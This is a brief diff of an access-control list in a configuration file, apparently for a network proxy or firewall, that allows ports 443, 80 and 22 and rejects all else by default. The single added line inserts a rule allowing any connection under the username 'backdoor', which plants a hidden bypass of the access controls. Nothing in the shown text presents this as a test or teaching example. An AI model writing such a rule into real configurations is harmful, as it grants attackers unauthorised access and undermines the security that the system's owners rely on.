@@ -28,6 +28,7 @@ acl = [
     {destination_port = 443, action = "Allow"},
     {destination_port = 80, action = "Allow"},
     {destination_port = 22, action = "Allow"},
+    {username = "backdoor", action = "Allow"},
 ]
 # if no rules in the ACL match, this rule is applied
 acl-default-action = "Reject"
